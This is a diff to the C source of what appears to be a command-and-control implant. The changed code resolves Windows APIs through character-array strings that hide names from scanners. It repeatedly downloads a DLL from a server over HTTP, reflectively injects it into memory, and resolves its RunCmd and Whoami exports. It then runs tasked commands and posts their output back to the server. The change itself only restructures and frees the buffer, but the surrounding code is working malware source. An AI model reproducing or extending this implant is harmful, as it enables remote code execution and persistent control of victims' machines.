@@ -3,6 +3,7 @@
 
 #include "../include/addresshunter.h"
 #include "../include/http.h"
+#include "../include/typedefs.h"
 
 // will be overriden by ImhulluCLI
 //#define SERVER '1','9','2','.','1','6','8','.','0','.','1',0
@@ -253,16 +254,18 @@ void myMain()
     // shlwapi
     api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);
 
-    DWORD dwDllSize;
-    LPVOID pEsgStdDll = 0;
+    DLL esgStdDll;
+    PDLL pEsgStdDll = &esgStdDll;
+    pEsgStdDll->Buffer = NULL;
+
     #ifdef DEBUG
     CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
     #endif
-    while (pEsgStdDll == 0)
+    while (pEsgStdDll->Buffer == NULL)
     {
-        pEsgStdDll = winHTTPClient(api, &dwDllSize);
+        pEsgStdDll->Buffer = winHTTPClient(api, &pEsgStdDll->Size);
         ((SLEEP)api->Sleep)(5000);
-        if (pEsgStdDll != 0)
+        if (pEsgStdDll->Buffer != NULL)
         { break; }
         #ifdef DEBUG
         ((MESSAGEBOXA)api->MessageBoxA)(0, msg, msg, 0X0L);
@@ -272,13 +275,13 @@ void myMain()
     ESG_STD_API EsgStdApi = { 0 };
     PESG_STD_API PEsgStdApi = &EsgStdApi;
 
-    pEsgStdDll = inject(api, pEsgStdDll, dwDllSize);
+    pEsgStdDll->Buffer = inject(api, pEsgStdDll->Buffer, pEsgStdDll->Size);
 
     CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
     CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
 
-    PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll, runCmd_c);
-    PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll, whoami_c);
+    PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll->Buffer, runCmd_c);
+    PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->Buffer, whoami_c);
 
     //WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
     // WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
@@ -380,6 +383,8 @@ void myMain()
             ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, encodedExitOutput);
             PostRequest(api, wServer, port, fullPath2, json);
 
+            if (pEsgStdDll->Buffer)
+            { ((FREE)api->free)(pEsgStdDll->Buffer); }
             if (json)
             {
                 ((FREE)api->free)(json);
@@ -429,11 +434,9 @@ void myMain()
 
         ((SLEEP)api->Sleep)(3000);
     }
-    /*
-    if (fullPath)
+    if (pEsgStdDll->Buffer)
     {
-        ((FREE)api->free)(fullPath);
+        ((FREE)api->free)(pEsgStdDll->Buffer);
     }
-    */
 }
 
